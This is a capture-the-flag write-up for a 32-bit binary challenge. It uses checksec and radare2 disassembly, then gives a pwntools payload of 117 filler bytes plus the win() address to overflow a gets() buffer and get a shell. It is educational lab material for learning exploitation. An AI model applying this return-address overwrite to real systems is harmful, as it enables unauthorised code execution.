# Chall_02

## Solution

##### Disassembling

First we run ```checksec --file=withoutpie``` to see any vulnerabilities and see there is ```No canary found``` and ```No PIE```. 

```console
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69) Symbols	  No	0		1		withoutpie
```

Then we run ```r2 -Ad a.out``` to disassemble the file in debug mode and then enter ```s main``` to be taken to main and ```Vp``` to open visual.

```assembly
43: sym.win ();                                                                                                                                               
│           ; var int32_t var_4h @ ebp-0x4                                                                                                                      
│           0x08049182      55             push ebp                                                                                                             
│           0x08049183      89e5           mov ebp, esp                                                                                                         
│           0x08049185      53             push ebx                                                                                                             
│           0x08049186      83ec04         sub esp, 4                                                                                                           
│           0x08049189      e888000000     call sym.__x86.get_pc_thunk.ax ;[1]                                                                                  
│           0x0804918e      05722e0000     add eax, 0x2e72                                                                                                      
│           0x08049193      83ec0c         sub esp, 0xc                                                                                                         
│           0x08049196      8d9008e0ffff   lea edx, [eax - 0x1ff8]                                                                                              
│           0x0804919c      52             push edx                                                                                                             
│           0x0804919d      89c3           mov ebx, eax                                                                                                         
│           0x0804919f      e8acfeffff     call sym.imp.system         ;[2] ; int system(const char *string)                                                    
│           0x080491a4      83c410         add esp, 0x10                                                                                                        
│           0x080491a7      90             nop                                                                                                                  
│           0x080491a8      8b5dfc         mov ebx, dword [var_4h]                                                                                              
│           0x080491ab      c9             leave                                                                                                                
└           0x080491ac      c3             ret                                                                                                                  
            ; CALL XREF from main @ 0x8049202                                                                                                                   
┌ 40: sym.vuln ();                                                                                                                                              
│           ; var int32_t var_71h @ ebp-0x71                                                                                                                    
│           ; var int32_t var_4h @ ebp-0x4                                                                                                                      
│           0x080491ad      55             push ebp                                                                                                             
│           0x080491ae      89e5           mov ebp, esp                                                                                                         
│           0x080491b0      53             push ebx                                                                                                             
│           0x080491b1      83ec74         sub esp, 0x74                                                                                                        
│           0x080491b4      e85d000000     call sym.__x86.get_pc_thunk.ax ;[1]                                                                                  
│           0x080491b9      05472e0000     add eax, 0x2e47                                                                                                      
│           0x080491be      83ec0c         sub esp, 0xc                                                                                                         
│           0x080491c1      8d558f         lea edx, [var_71h]                                                                                                   
│           0x080491c4      52             push edx                                                                                                             
│           0x080491c5      89c3           mov ebx, eax                                                                                                         
│           0x080491c7      e864feffff     call sym.imp.gets           ;[3] ; char *gets(char *s)                                                               
│           0x080491cc      83c410         add esp, 0x10                                                                                                        
│           0x080491cf      90             nop                                                                                                                  
│           0x080491d0      8b5dfc         mov ebx, dword [var_4h]                                                                                              
│           0x080491d3      c9             leave                                                                                                                
└           0x080491d4      c3             ret                                                                                                                  
            ; DATA XREFS from entry0 @ 0x8049096, 0x804909c                                                                                                     
┌ 65: int main (char **argv);                                                                                                                                   
│           ; var int32_t var_8h @ ebp-0x8                                                                                                                      
│           ; arg char **argv @ esp+0x24                                                                                                                        
│           0x080491d5      8d4c2404       lea ecx, [argv]                                                                                                      
│           0x080491d9      83e4f0         and esp, 0xfffffff0                                                                                                  
│           0x080491dc      ff71fc         push dword [ecx - 4]                                                                                                 
│           0x080491df      55             push ebp                                                                                                             
│           0x080491e0      89e5           mov ebp, esp                                                                                                         
|           0x080491e2      53             push ebx                                                                                                             
│           0x080491e3      51             push ecx                                                                                                             
│           0x080491e4      e82d000000     call sym.__x86.get_pc_thunk.ax ;[1]                                                                                  
│           0x080491e9      05172e0000     add eax, 0x2e17                                                                                                      
│           0x080491ee      83ec0c         sub esp, 0xc                                                                                                         
│           0x080491f1      8d9010e0ffff   lea edx, [eax - 0x1ff0]                                                                                              
│           0x080491f7      52             push edx                                                                                                             
│           0x080491f8      89c3           mov ebx, eax                                                                                                         
│           0x080491fa      e841feffff     call sym.imp.puts           ;[3] ; int puts(const char *s)                                                           
│           0x080491ff      83c410         add esp, 0x10                                                                                                        
│           0x08049202      e8a6ffffff     call sym.vuln               ;[4]                                                                                     
│           0x08049207      b800000000     mov eax, 0                                                                                                           
│           0x0804920c      8d65f8         lea esp, [var_8h]                                                                                                    
│           0x0804920f      59             pop ecx                                                                                                              
│           0x08049210      5b             pop ebx                                                                                                              
│           0x08049211      5d             pop ebp                                                                                                              
│           0x08049212      8d61fc         lea esp, [ecx - 4]                                                                                                   
└           0x08049215      c3             ret   
```

We notice there is a ```main()``` function that calls a ```vuln()``` function which should return back to ```main()``` unless we reroute it to the ```win()``` function.

So we need to send the program to the address that ```win()``` starts which is ```0x08049182```. This time instead of subtracting we need to add ```0x71``` to ```0x4``` which will give us the manipulation of the stack we need to send the program to ```0x08049182```. 

We hop on to ipython3 and ```from pwn import *``` and create a process with ```p = process ("./withoutpie")``` and send the junk to fill the space provided along with the new value we want to compare with ```p.sendline(b'A' * 117 + p32(0x08049182))```

After that we gain shell with ```p.interactive```
